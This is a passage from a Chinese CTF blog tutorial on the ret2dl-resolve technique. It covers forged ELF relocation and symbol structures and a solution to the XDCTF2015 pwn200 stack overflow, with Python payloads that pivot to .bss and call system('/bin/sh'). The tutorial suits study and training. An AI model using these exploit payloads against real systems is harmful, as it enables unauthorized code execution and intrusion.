<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; .rel.plt + 第二个参数`求出当前函数的重定位表项`Elf32_Rel`的指针，记作`rel</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这个时候，<code>_dl_runtime_resolve</code>并没有检查<code>.rel.plt + 第二个参数</code>后是否造成越界访问，所以我们能给一个很大的<code>.rel.plt</code>的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说<code>.bss</code>。</p>
<p>然后第三步</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; rel-&gt;r_info &gt;&gt; 8`作为`.dynsym`的下标，求出当前函数的符号表项`Elf32_Sym`的指针，记作`sym</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>所以在我们所伪造的<code>Elf32_Rel</code>，需要放一个<code>r_info</code>字段，大概长这样就行<code>0xXXXXXX07</code>，其中XXXXXX是相对<code>.dynsym</code>表的下标，注意不是偏移，所以是偏移除以<code>Elf32_Sym</code>的大小，即除以<code>0x10</code>（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个<code>Elf32_Sym</code>。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。</p>
<p>然后第四步</p>
<blockquote>
<p><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</p>
</blockquote>
<p>同样类似，没有进行越界访问检查，所以这个字符串也能够伪造。</p>
<p>所以，最终的利用思路，大概是</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_GP7F2G76BJHTFAX.png.jpg" alt="img"></p>
<p>构造ROP，跳转到resolve的PLT，<code>push link_map</code>的位置，就是上图所示的这个地方。此时，栈中必须要有已经伪造好的指向伪造的<code>Elf32_Rel</code>的偏移，然后是返回地址（<code>system</code>的话无所谓），再然后是参数（如果是<code>system</code>函数的话就要是指向<code>&quot;/bin/sh\x00&quot;</code>的指针）</p>
<p>最后来道经典例题，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // eax</span><br><span class="line">  char buf[4]; // [esp+0h] [ebp-6Ch]</span><br><span class="line">  char v4; // [esp+18h] [ebp-54h]</span><br><span class="line">  int *v5; // [esp+64h] [ebp-8h]</span><br><span class="line"> </span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);</span><br><span class="line">  memset(&amp;v4, 0, 0x4Cu);</span><br><span class="line">  setbuf(stdout, buf);</span><br><span class="line">  v1 = strlen(buf);</span><br><span class="line">  write(1, buf, v1);</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[108]; // [esp+Ch] [ebp-6Ch]</span><br><span class="line"> </span><br><span class="line">  setbuf(stdin, buf);</span><br><span class="line">  return read(0, buf, 256u); //栈溢出</span><br><span class="line">&#125;</span><br><span class="line">//gcc -m32 -fno-stack-protector -no-pie -s pwn200.c</span><br></pre></td></tr></table></figure>

<p>明显的栈溢出，但是没给libc，ROPgadget也少，所以要用ret2dl-resolve。</p>
<p>利用思路如下:</p>
<ol>
<li><p>第一次调用<code>read</code>函数，返回地址再溢出成<code>read</code>函数，这次参数给一个<code>.bss</code>的地址，里面放我们的payload，包括所有伪造的数据结构以及ROP。注意ROP要放在数据结构的前面，不然ROP调用时有可能污染我们伪造的数据结构，而且前面要预留一段空间给ROP所调用的函数用。调用完第二个<code>read</code>之后，ROP到<code>leave; retn</code>的地址，以便切栈切到在<code>.bss</code>中我们构造的下一个ROP链</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">"A"</span> * <span class="number">108</span></span><br><span class="line">payload1 += p32(NEXT_ROP) <span class="comment"># ebp会在这里被pop出来，到时候leave就可以切栈</span></span><br><span class="line">payload1 += p32(READ_ADDR)</span><br><span class="line">payload1 += p32(LEAVE_RETN)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(BUFFER - ROP_SIZE)</span><br><span class="line">payload1 += p32(<span class="number">0x100</span>)</span><br><span class="line">payload1 += <span class="string">"P"</span> * (<span class="number">0x100</span> - len(payload1))</span><br><span class="line">sh.send(payload1)</span><br></pre></td></tr></table></figure>
</li>
<li><p>第二次调用<code>read</code>函数，此时要<code>send</code>ROP链以及所有相关的伪造数据结构</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_Elf32_Rel = p32(STRLEN_GOT)</span><br><span class="line">fake_Elf32_Rel += p32(FAKE_SYMTAB_IDX)</span><br><span class="line"> </span><br><span class="line">fake_Elf32_Sym = p32(FAKE_STR_OFF)</span><br><span class="line">fake_Elf32_Sym += p32(<span class="number">0</span>)</span><br><span class="line">fake_Elf32_Sym += p32(<span class="number">0</span>)</span><br><span class="line">fake_Elf32_Sym += chr(<span class="number">0x12</span>) + chr(<span class="number">0</span>) + p16(<span class="number">0</span>) <span class="comment"># 其它字段直接照抄IDA里面的数据就好</span></span><br><span class="line"> </span><br><span class="line">strings = <span class="string">"system\x00/bin/sh\x00\x00"</span></span><br><span class="line"> </span><br><span class="line">rop = p32(<span class="number">0</span>) <span class="comment"># pop ebp, 随便设反正不用了</span></span><br><span class="line">rop += p32(DYN_RESOL_PLT) <span class="comment"># resolve的PLT，就是前面说的push link_map那个位置</span></span><br><span class="line">rop += p32(FAKE_REL_OFF) <span class="comment"># 伪造的重定位表OFFSET</span></span><br><span class="line">rop += <span class="string">"AAAA"</span> <span class="comment"># 返回地址，不用了随便设</span></span><br><span class="line">rop += p32(BIN_SH_ADDR) <span class="comment"># 参数，"/bin/sh"</span></span><br><span class="line"> </span><br><span class="line">payload2 = rop + fake_Elf32_Rel + fake_Elf32_Sym + strings</span><br><span class="line"> </span><br><span class="line">sh.send(payload2)</span><br></pre></td></tr></table></figure>

<p>至于offset这些东西要自己慢慢撸，反正我搞了挺久的。。。就在IDA里把地址copy出来然后慢慢算偏移就好了。。。</p>
<p>完整exp写的有点丑，放附件了。</p>
<p>PS: 其他一些大佬博客的exp我没有很看懂。。。不知道为啥要写那么长。。。我是弄懂了方法就按照自己的思路写的，不过也对就是了。。。</p>
<p>然后貌似有个自动得出ROP的工具叫作<a href="https://github.com/inaz2/roputils" target="_blank" rel="noopener">roputils</a>，这样就不用自己搞这么一串ROP了。。。不过用工具前还是要先搞懂原理的不然就成脚本小子了嘛。。。</p>
<h2 id="伪造link-map"><a href="#伪造link-map" class="headerlink" title="伪造link_map?"></a>伪造link_map?</h2><p>貌似也可行，而且64位下<code>link_map+0x1c8</code> 好像要置0，所以可能要自己伪造<code>link_map</code>。但是<code>link_map</code>结构有点复杂，网上也没有关于这种利用方式的资料，以后有空会再研究一下。。。</p>

    </div>

    
    
    
        
      

      <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-next post-nav-item">
              
                <a href="/2019/10/07/BugKu-Re-1/" rel="next" title="BugKu_Re(1)">
                  <i class="fa fa-chevron-left"></i> BugKu_Re(1)
                </a>
              
            </div>

            <span class="post-nav-divider"></span>

            <div class="post-nav-prev post-nav-item">
              
                <a href="/2019/10/07/ǳ̸Linux-Heap/" rel="prev" title="浅谈Linux-Heap">
                  浅谈Linux-Heap <i class="fa fa-chevron-right"></i>
                </a>
              
            </div>
          </div>
        
      </footer>
    
  </div>
  
  
  
  </article>

  </div>


          </div>
          

        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">
        
        
        
        
      

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2dl-resolve详解"><span class="nav-number">1.</span> <span class="nav-text">ret2dl-resolve详解</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前言"><span class="nav-number">2.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-ELF文件格式以及动态链接"><span class="nav-number">3.</span> <span class="nav-text">0x01 ELF文件格式以及动态链接</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#linux如何调用库函数"><span class="nav-number">3.1.</span> <span class="nav-text">linux如何调用库函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF关于动态链接的一些关键section"><span class="nav-number">3.2.</span> <span class="nav-text">ELF关于动态链接的一些关键section</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dynamic"><span class="nav-number">3.2.1.</span> <span class="nav-text">.dynamic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dynstr"><span class="nav-number">3.2.2.</span> <span class="nav-text">.dynstr</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dynsym"><span class="nav-number">3.2.3.</span> <span class="nav-text">.dynsym</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rel-plt"><span class="nav-number">3.2.4.</span> <span class="nav-text">.rel.plt</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dl-runtime-resolve做了什么"><span class="nav-number">3.3.</span> <span class="nav-text">_dl_runtime_resolve做了什么</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dl-runtime-resolve会"><span class="nav-number">3.3.1.</span> <span class="nav-text">_dl_runtime_resolve会</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-ret2dl-resolve-利用"><span class="nav-number">4.</span> <span class="nav-text">0x02 ret2dl-resolve 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#改写-dynamic的DT-STRTAB"><span class="nav-number">4.1.</span> <span class="nav-text">改写.dynamic的DT_STRTAB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#操纵第二个参数，使其指向我们所构造的Elf32-Rel"><span class="nav-number">4.2.</span> <span class="nav-text">操纵第二个参数，使其指向我们所构造的Elf32_Rel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#伪造link-map"><span class="nav-number">4.3.</span> <span class="nav-text">伪造link_map?</span></a></li></ol></li></ol></div>
        
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
  <div class="site-description" itemprop="description">Resit much,Obey little</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">71</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span>
        
      </div>
    
  </nav>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>

<div>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv" style='display:none'>
    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
    <span class="post-meta-divider">|</span>
</span>
<span id="busuanzi_container_site_uv" style='display:none'>
    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
</span>
</div>

        












        
      </div>
    </footer>
  </div>

  


  <script src="/lib/anime.min.js?v=3.1.0"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
<script src="/js/schemes/pisces.js?v=7.4.0"></script>

<script src="/js/next-boot.js?v=7.4.0"></script>



  








  <script src="/js/local-search.js?v=7.4.0"></script>














  

  

  

</body>
</html>
